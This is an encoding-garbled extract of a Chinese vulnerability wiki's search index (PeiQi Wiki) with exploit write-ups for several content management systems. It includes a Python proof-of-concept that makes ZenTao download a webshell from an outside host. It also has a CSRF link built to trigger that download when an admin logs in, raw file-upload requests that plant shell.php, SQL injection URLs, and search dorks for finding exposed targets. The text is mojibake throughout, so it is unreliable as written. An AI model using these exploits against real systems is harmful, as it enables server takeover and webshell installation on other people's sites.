ä¾‹å¦‚æˆ‘ä¸Šä¼ çš„æ–‡ä»¶URLä¸ºhttp://peiqi.tech/SHELL.php http://peiqi.tech/SHELL.php | base64åŠ å¯† HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw è¯·æ±‚åœ°å€åˆ™ä¸º http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw ä¸‹è½½çš„ç›®å½•åœ°å€ä¸ºzentaopms\\www\\data\\client\\1 [!NOTE] ç›®å½•ä¸ºversionåç§° æˆåŠŸä¸Šä¼ webshell æ¼æ´åˆ©ç”¨POC [!NOTE] POCä½¿ç”¨éœ€è¦æ‹¥æœ‰åå°Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: zentao version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mShell >>> http://xxx.xxx.xxx.xxx/shell.php(æ¶æ„æ–‡ä»¶åœ°å€) \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookieå­—æ®µ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] ç¦…é“ç‰ˆæœ¬ä¸º:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] è·å–ç‰ˆæœ¬å¤±è´¥ \\033[0m\", e) def POC_2(target_url, shell_url, zentaosid): options = shell_url.split(\"://\") if options[0] == \"http\": shell_url = \"HTTP://\" + options[1] elif options[0] == \"ftp\": shell_url = \"ftp://\" + options[1] else: print(\"\\033[31m[x] è¯·ä½¿ç”¨æ­£ç¡®çš„è¯·æ±‚åœ°å€ \\033[0m\") sys.exit(0) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"zentaosid={}\".format(zentaosid) } shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8') vuln_url = target_url + \"/www/index.php?m=client&f=download&version=test&link={}\".format(shell_url_base) print(\"\\033[32m[o] è¯·æ±‚æ¼æ´urlï¼š{}\\033[0m\".format(vuln_url)) try: response = requests.get(url=vuln_url, timeout=20, headers=headers) if \"ä¿å­˜æˆåŠŸ\" in response.text: print(\"\\033[32m[o] æˆåŠŸå†™å…¥Webshellï¼ŒURLåœ°å€ä¸ºï¼š{}/www/data/client/test/Webshell_name.php\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] æ¶æ„æ–‡ä»¶ä¸‹è½½å¤±è´¥ \\033[0m\") except: print(\"\\033[31m[x] æ¶æ„æ–‡ä»¶ä¸‹è½½å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) shell_url = str(input(\"\\033[35mShell >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, shell_url, zentaosid) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç¦…é“CMS/ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552.html","title":"ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ CNVD-2020-68552","keywords":"","body":"ç¦…é“ å°äº12.4.2 CSRFæ¼æ´ æ¼æ´æè¿° å¯ä»¥é’ˆå¯¹ç¦…é“çš„éƒ¨åˆ†æ¨¡å—åˆ¶é€ æ¶æ„URLåœ°å€å‘é€ç»™ç®¡ç†å‘˜ï¼Œå½“ç®¡ç†å‘˜ç™»å½•æ—¶ä¼šæ‰§è¡Œæ¨¡å—çš„æ¶æ„è¯·æ±‚,å¯ç”¨äºè¿›è¡Œé’“é±¼è¯·æ±‚ å½±å“ç‰ˆæœ¬ [!NOTE] ç¦…é“ ç¯å¢ƒæ­å»º ç™¾åº¦ä¸‹12.4.2çš„ç¦…é“ç¯å¢ƒæŒ‰æ­¥éª¤å®‰è£…ä¸‹è½½å³å¯ ç¦…é“å®˜æ–¹ç½‘ç«™ è°ƒç”¨æ¥å£æŸ¥è¯¢ç‰ˆæœ¬ä¿¡æ¯ http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig æ¼æ´å¤ç° è¿™é‡Œåˆ©ç”¨ ç¦…é“ å°äº12.4.2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ CNVD-C-2020-121325(å¯å‚ç…§ä¸Šä¸€ç¯‡æ–‡ç« ) æ¥æ„é€ ä¸€ä¸ªæ¶æ„çš„URLåœ°å€ æŸ¥çœ‹module/common/model.phpçš„checkPrivæ–¹æ³• public function checkPriv() { $module = $this->app->getModuleName(); $method = $this->app->getMethodName(); if($this->app->isFlow) { $module = $this->app->rawModule; $method = $this->app->rawMethod; } if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!defined('IN_UPGRADE')) $this->session->user->view = $this->loadModel('user')->grantUserView(); $this->app->user = $this->session->user; if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } è¿™é‡Œçš„ä»£ç ç‰‡æ®µä¸ºé‰´æƒå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æœ€åä¸€å¥ä»£ç  $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); æ‰€ä»¥å½“è°ƒç”¨å½“å‰æƒé™ä¸å…è®¸çš„æ–¹æ³•æ—¶ï¼Œä¼šè¿›è¡Œè·³è½¬ï¼Œå¹¶åœ¨$refererå‚æ•°ç¼“å­˜è°ƒç”¨çš„æ–¹æ³•URLï¼Œå½“ä½¿ç”¨è¿™ä¸ªè·³è½¬çš„åœ°å€ç™»å½•æ—¶åˆ™ä¼šç›´æ¥è°ƒç”¨æ­¤æ–¹æ³• URLåœ°å€æ„é€ è¿‡ç¨‹ http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=HTTP://peiqi.tech/SHELL.php å°†linkå‚æ•°base64åŠ å¯† http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=/www/index.php.m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw å°†refererå‚æ•°ä»¥ . åšåˆ†å‰²base64åŠ å¯†ä¸¤è¾¹å­—ç¬¦ http://xxx.xxx.xxx.xxx/www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA.bT1jbGllbnQmZj1kb3dubG9hZCZ2ZXJzaW9uPTEmbGluaz1TRlJVVURvdkwzQmxhWEZwTG5SbFkyZ3ZVMGhGVEV3dWNHaHc= å°†è¿™ä¸ªURLåœ°å€å‘é€ç»™ç®¡ç†å‘˜ï¼Œå½“ç®¡ç†å‘˜ç™»å½•æ—¶åˆ™ä¼šè§¦å‘æ¶æ„æ–‡ä»¶ä¸‹è½½ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/å¿«æ’CMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/å¿«æ’CMS/","title":"å¿«æ’CMS","keywords":"","body":"å¿«æ’CMS å¿«æ’CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ å¿«æ’CMS ä¿¡æ¯æ³„éœ²æ¼æ´ å¿«æ’CMS åå°XSSæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-06 16:47:38 "},"PeiQi_Wiki/CMSæ¼æ´/å¿«æ’CMS/å¿«æ’CMS ä¿¡æ¯æ³„éœ²æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/å¿«æ’CMS/å¿«æ’CMS ä¿¡æ¯æ³„éœ²æ¼æ´.html","title":"å¿«æ’CMS ä¿¡æ¯æ³„éœ²æ¼æ´","keywords":"","body":"å¿«æ’CMS ä¿¡æ¯æ³„éœ²æ¼æ´ æ¼æ´æè¿° å¿«æ’CMS é»˜è®¤å¼€å¯æ—¥å¿—è®°å½•ï¼Œç”±äºæ—¥å¿—åä¸ºæ—¶é—´ä½œä¸ºæ–‡ä»¶åï¼Œé€ æˆç®¡ç†å‘˜çš„Cookieæ³„éœ² æ¼æ´å½±å“ [!NOTE] å¿«æ’ CMS ç¯å¢ƒæ­å»º https://gitee.com/qingzhanwang/kpcms æ¼æ´å¤ç° æ–‡ä»¶ thinkphp/library/think/log/driver/Socket.php è¿™é‡Œé»˜è®¤å¼€å¯æ—¥å¿—å†™å…¥ runtime/log/202104/06.log å…¶ä¸­å¯ä»¥çœ‹åˆ°æ³„éœ²äº†ç®¡ç†å‘˜çš„Cookieä¿¡æ¯å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯ å¹¶ä¸”æ–‡ä»¶å‘½åä¸º å¹´+æœˆ/æ—¥æœŸ.log è¿™é‡Œå…³æ³¨åå°çš„æ—¥å¿—æ–‡ä»¶ä¸­çš„ admin.phpé¡µé¢çš„cookieå°±å¯ä»¥è·å¾—ç®¡ç†å‘˜æƒé™ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/å¿«æ’CMS/å¿«æ’CMS åå°XSSæ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/å¿«æ’CMS/å¿«æ’CMS åå°XSSæ¼æ´.html","title":"å¿«æ’CMS åå°XSSæ¼æ´","keywords":"","body":"å¿«æ’CMS åå°XSSæ¼æ´ æ¼æ´æè¿° å¿«æ’CMS åå°å­˜åœ¨XSSæ¼æ´ï¼Œé€šè¿‡åå°æ„é€ ç‰¹æ®Šè¯­å¥å¯ä»¥é€ æˆè®¿é—®ç½‘ç«™çš„ç”¨æˆ·è¢«XSSå½±å“ æ¼æ´å½±å“ [!NOTE] å¿«æ’ CMS ç¯å¢ƒæ­å»º https://gitee.com/qingzhanwang/kpcms æ¼æ´å¤ç° æ¼æ´å‡ºç°åœ¨ç™»å½•åå°çš„ç½‘ç«™ç¼–è¾‘çš„ä½ç½®ï¼Œç”±äºæ²¡æœ‰å¯¹è¾“å‡ºçš„å­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´XSS ä¸»é¡µç‰ˆæƒå¤„åµŒå…¥XSSä»£ç  PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/å¿«æ’CMS/å¿«æ’CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/å¿«æ’CMS/å¿«æ’CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"å¿«æ’CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"å¿«æ’CMS ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° å¿«æ’CMS åå°ç®¡ç†æ¨¡å—å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] å¿«æ’ CMS ç¯å¢ƒæ­å»º https://gitee.com/qingzhanwang/kpcms æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹, é»˜è®¤è´¦å·å¯†ç ä¸º admin/admin http://xxx.xxx.xxx.xxx/admin.php/index/login.html æºç ä¸­æ²¡æœ‰å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€æ£€æµ‹ thinkphp/library/think/File.php ä»»æ„æ‰¾ä¸€å¤„æ–‡ä»¶ä¸Šä¼ ç‚¹ ä¸Šä¼ æŠ“åŒ…è·å–æ–‡ä»¶åœ°å€ POST /admin.php/index/upload.html?dir=image HTTP/1.1 Host: 192.168.1.108:88 Content-Length: 935 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.1.108:88 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.1.108:88/admin.php/config/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"localUrl\" C:\\fakepath\\shell.php ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"imgFile\"; filename=\"shell.php\" Content-Type: application/octet-stream ------WebKitFormBoundaryYIt9WaQZiDMrwAVm-- è¿æ¥å†°èæœ¨é©¬å³å¯ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/","title":"ç‹®å­é±¼CMS","keywords":"","body":"ç‹®å­é±¼CMS ç‹®å­é±¼CMS wxapp.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ ç‹®å­é±¼CMS image_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼  ç‹®å­é±¼CMS ApigoodController.class.php SQLæ³¨å…¥æ¼æ´ ç‹®å­é±¼CMS ApiController.class.php SQLæ³¨å…¥æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-14 18:34:49 "},"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/ç‹®å­é±¼CMS wxapp.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/ç‹®å­é±¼CMS wxapp.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"ç‹®å­é±¼CMS wxapp.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"ç‹®å­é±¼CMS wxapp.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° ç‹®å­é±¼CMS wxapp.phpæ–‡ä»¶ å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…åœ¨æ²¡æœ‰èº«ä»½éªŒè¯çš„æƒ…å†µä¸‹å¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ æ¼æ´å½±å“ [!NOTE] ç‹®å­é±¼CMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å‘é€è¯·æ±‚åŒ…ä¸Šä¼ PHPæ–‡ä»¶ POST /wxapp.php?controller=Goods.doPageUpload HTTP/1.1 Host: Content-Length: 210 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"upfile\"; filename=\"test.php\" Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif ------WebKitFormBoundary8UaANmWAgM4BqBSs-- PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 18:59:19 "},"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/ç‹®å­é±¼CMS image_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/ç‹®å­é±¼CMS image_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"ç‹®å­é±¼CMS image_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"ç‹®å­é±¼CMS image_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´æè¿° ç‹®å­é±¼CMSä½¿ç”¨CKç¼–è¾‘å™¨ï¼Œå­˜åœ¨å›¾ç‰‡ä¸Šä¼ çš„ç»•è¿‡ï¼Œé€ æˆ image_upload.php ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´å½±å“ [!NOTE] ç‹®å­é±¼CMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ æ¼æ´æ–‡ä»¶ä¸º CKç¼–è¾‘å™¨çš„ image_upload.php $max_size) { // åˆ¤æ–­æ–‡ä»¶å¤§å°æ˜¯å¦å¤§äº500000å­—èŠ‚ echo '{\"result\":\"400\",\"msg\":\"ä¸Šä¼ å›¾ç‰‡å¤ªå¤§ï¼Œæœ€å¤§æ”¯æŒï¼š'.($max_size/1024).'KB\"}'; exit (); } if (! in_array ( $file ['type'], $arrType )) { // åˆ¤æ–­å›¾ç‰‡æ–‡ä»¶çš„æ ¼å¼ echo '{\"result\":\"400\",\"msg\":\"ä¸Šä¼ å›¾ç‰‡æ ¼å¼ä¸å¯¹\"}'; exit (); } if (! file_exists ( $upfile )) { // åˆ¤æ–­å­˜æ”¾æ–‡ä»¶ç›®å½•æ˜¯å¦å­˜åœ¨ mkdir ( $upfile, 0777, true ); } $imageSize = getimagesize ( $file ['tmp_name'] ); $img = $imageSize [0] . '*' . $imageSize [1]; $fname = $file ['name']; $ftype = explode ( '.', $fname ); $time = explode ( \" \", microtime () ); $time = $time [1] . ($time [0] * 1000); $time2 = explode ( \".\", $time ); $time = $time2 [0]; $returnName=$time.\".\" .end($ftype); $picName = $upfile . \"/\" . $returnName ; if (! move_uploaded_file ( $file ['tmp_name'], $picName )) { echo '{\"result\":\"400\",\"msg\":\"ä»:'.$file ['tmp_name'].'ç§»åŠ¨å›¾ç‰‡åˆ°:'.$picName.'å‡ºé”™\"}'; exit (); } else { echo '{\"result\":\"200\",\"imgurl\":\"http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/' . $returnName . '\"}'; } } ?> å…¶ä¸­ä½¿ç”¨ Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif å³å¯ç»•è¿‡ä¸Šä¼ PHPæ–‡ä»¶ POST /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php HTTP/2 Host: Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs Content-Length: 208 ------WebKitFormBoundary8UaANmWAgM4BqBSs Content-Disposition: form-data; name=\"files\"; filename=\"test.php\" Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif ------WebKitFormBoundary8UaANmWAgM4BqBSsâ€” è®¿é—®è¿”å›çš„æ–‡ä»¶è·¯å¾„ /Common/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/uploads/xxxxx.php PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 18:17:17 "},"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/ç‹®å­é±¼CMS ApigoodController.class.php SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/ç‹®å­é±¼CMS ApigoodController.class.php SQLæ³¨å…¥æ¼æ´.html","title":"ç‹®å­é±¼CMS ApigoodController.class.php SQLæ³¨å…¥æ¼æ´","keywords":"","body":"ç‹®å­é±¼CMS ApigoodsController.class.php SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° ç‹®å­é±¼CMS ApiController.class.php å‚æ•°è¿‡æ»¤å­˜åœ¨ä¸ä¸¥è°¨ï¼Œå¯¼è‡´SQLæ³¨å…¥æ¼æ´ æ¼æ´å½±å“ [!NOTE] ç‹®å­é±¼CMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å­˜åœ¨æ¼æ´çš„æ–‡ä»¶ä¸º ApigoodsController.class.php , å…³é”®ä½ç½®ä¸º public function get_goods_detail() { $id = I('get.id'); $pin_id = I('get.pin_id', 0); $token = I('get.token'); $weprogram_token = M('weprogram_token')->field('member_id')->where( array('token' =>$token) )->find(); $member_id = $weprogram_token['member_id']; $need_data = array(); $sql = \"select g.*,gd.description,gd.is_untake_level,level_discount,gd.video_src,gd.video_size_width,gd.vedio_size_height,gd.is_video, gd.summary,gd.share_title,gd.activity_summary,gd.tag from \" . C('DB_PREFIX') . \"goods g,\" . C('DB_PREFIX') . \"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\" . $id; $goods = M()->query($sql); $pin_model = D('Home/Pin'); $goods_model = D('Home/Goods'); $qian = array( \"/Uploads/image\" ); $c_site_url = str_replace('/dan','',C('SITE_URL')); $hou = array( $c_site_url . \"/Uploads/image\" ); $goods[0]['video_src'] = C('SITE_URL').\"Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/\".$goods[0]['video_src']; $goods[0]['description'] = str_replace($qian, $hou, $goods[0]['description']); $goods[0]['description'] = htmlspecialchars_decode($goods[0]['description']); $qian = array( \"\\r\\n\" ); æ¼æ´æµ‹è¯•ä¸º https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/ç‹®å­é±¼CMS ApiController.class.php SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/ç‹®å­é±¼CMS/ç‹®å­é±¼CMS ApiController.class.php SQLæ³¨å…¥æ¼æ´.html","title":"ç‹®å­é±¼CMS ApiController.class.php SQLæ³¨å…¥æ¼æ´","keywords":"","body":"ç‹®å­é±¼CMS ApiController.class.php SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° ç‹®å­é±¼CMS ApiController.class.php å‚æ•°è¿‡æ»¤å­˜åœ¨ä¸ä¸¥è°¨ï¼Œå¯¼è‡´SQLæ³¨å…¥æ¼æ´ æ¼æ´å½±å“ [!NOTE] ç‹®å­é±¼CMS FOFA [!NOTE] \"/seller.php?s=/Public/login\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ å­˜åœ¨æ¼æ´çš„æ–‡ä»¶ä¸º ApiController.class.php , å…³é”®ä½ç½®ä¸º public function goods_detail() { $goods_id = I('get.goods_id'); //gallery =>img_url //goods goods.goods_desc goods_name group_price market_price sell_count group_number $sql=\"select g.*,gd.description,gd.summary,gd.tag from \". C('DB_PREFIX').\"goods g,\".C('DB_PREFIX').\"goods_description gd where g.goods_id=gd.goods_id and g.goods_id=\".$goods_id; $goods_arr=M()->query($sql); $qian=array(\"\\r\\n\"); $hou=array(\"\"); $goods_arr[0]['summary'] = str_replace($qian,$hou,$goods_arr[0]['summary']); $sql=\"select image from \".C('DB_PREFIX').\"goods_image where goods_id=\".$goods_id; $goods_image=M()->query($sql); $gallery = array(); $default_image = ''; foreach($goods_image as $val) { $val['img_url'] = str_replace('http','https',C('SITE_URL')).'/Uploads/ http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/'.$val['image']; if(empty($default_image)) { $default_image = str_replace('http','https',C('SITE_URL')).resize($val['image'], C('goods_thumb_width'), C('goods_thumb_height')); } $gallery[] = array('img_url' => $val['img_url']); } $goods = $goods_arr[0]; æ¼æ´æµ‹è¯•ä¸º https://xxx.xxx.xx.xxx/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/CMSæ¼æ´/åŸåˆ›å…ˆé”‹/":{"url":"PeiQi_Wiki/CMSæ¼æ´/åŸåˆ›å…ˆé”‹/","title":"åŸåˆ›å…ˆé”‹","keywords":"","body":"åŸåˆ›å…ˆé”‹ åŸåˆ›å…ˆé”‹ åå°ç®¡ç†å¹³å° æœªæˆæƒè®¿é—®æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-02 23:35:02 "},"PeiQi_Wiki/CMSæ¼æ´/åŸåˆ›å…ˆé”‹/åŸåˆ›å…ˆé”‹ åå°ç®¡ç†å¹³å° æœªæˆæƒè®¿é—®æ¼æ´.html":{"url":"PeiQi_Wiki/CMSæ¼æ´/åŸåˆ›å…ˆé”‹/åŸåˆ›å…ˆé”‹ åå°ç®¡ç†å¹³å° æœªæˆæƒè®¿é—®æ¼æ´.html","title":"åŸåˆ›å…ˆé”‹ åå°ç®¡ç†å¹³å° æœªæˆæƒè®¿é—®æ¼æ´","keywords":"","body":"åŸåˆ›å…ˆé”‹ åå°ç®¡ç†å¹³å° æœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´æè¿° åŸåˆ›å…ˆé”‹ åå°ç®¡ç†å¹³å° å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡æ¼æ´å¯ä»¥ä»»æ„æ¥ç®¡è´¦æˆ·æƒé™ æ¼æ´å½±å“ [!NOTE] åŸåˆ›å…ˆé”‹ åå°ç®¡ç†å¹³å° FOFA [!NOTE] body=\"https://www.bjycxf.com\" æ¼æ´å¤ç° åå°ç™»é™†é¡µé¢å¦‚ä¸‹ æœªæˆæƒçš„Url /admin/admin/admin_list.html ç‚¹å‡»æ·»åŠ å¹¶æˆæƒå³å¯è·å–åå°æ¨¡å—æƒé™ å‚è€ƒæ–‡ç«  http://www.0dayhack.net/index.php/1693/ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 